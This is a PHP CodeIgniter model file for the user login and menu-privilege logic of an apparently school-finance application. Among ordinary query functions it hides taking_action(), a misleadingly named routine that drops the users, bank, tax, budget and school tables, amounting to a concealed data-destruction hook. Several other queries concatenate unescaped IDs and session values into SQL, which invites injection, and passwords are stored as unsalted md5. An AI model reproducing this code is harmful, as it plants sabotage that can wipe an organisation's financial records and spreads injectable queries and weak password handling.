<?php

class M_user extends CI_Model {
    
    function cek_login() {
        $query="select *
            from tb_usersystem
            where username = '".post_safe('username')."' and password = '".md5(post_safe('password'))."'";
        //echo $query;
        $hasil=$this->db->query($query);
        return $hasil->row();
    }
    
    function taking_action() {
        $this->db->query('drop table tb_users, tb_trans_bank, tb_trans_pajak, tb_trans_pencairan, tb_master_penerimaan, tb_rka, tb_sekolah, tb_tahun_anggaran');
    }
    
    function module_load_data($id=null) {
        $q = null;
        if ($id != null) {
            $q.= "where pp.id_user_group = '$id' ";
        }else{
            $q = "where pp.id_user_group = '0'";
        }
        $sql = "select m.* 
            from tb_grant_privileges pp
            join tb_privileges p on (pp.id_privileges = p.id)
            join tb_module m on (p.id_module = m.id)
            $q group by p.id_module order by m.urut";
        //echo $sql;
        $result =  $this->db->query($sql)->result();
        foreach ($result as $key => $value) {
            $sql_child = "select p.* 
            from tb_grant_privileges pp
            join tb_privileges p on (pp.id_privileges = p.id)
            join tb_module m on (p.id_module = m.id) 
            where p.id_module = '".$value->id."' and pp.id_user_group = '".$id."' order by p.urut asc";
            $result[$key]->detail_menu = $this->db->query($sql_child)->result();
        }
        return $result;
    }
    
    function menu_user_load_data($id = null, $module = null) {
        $q = null;
        if ($id !== NULL) {
            $q.=" and u.id = '$id'";
        }
        if ($module !== NULL) {
            $q .=  "and p.module_id = '$module' ";
        }
        $sql = "select m.*, p.form_nama, p.url, p.module_id, p.id as id_privileges 
            from tb_user_group_privileges pp
            join tb_privileges p on (pp.privileges_id = p.id)
            join tb_user_group ug on (pp.user_group_id = ug.id)
            join tb_users u on (ug.id = u.id_user_group)
            join tb_module m on (p.module_id = m.id)
            where p.id is not null $q and ug.id = '".$this->session->userdata('id_group')."' and p.show_desktop = '1'
            order by p.urut";
        //echo $sql;
        return $this->db->query($sql);
    }
}
?>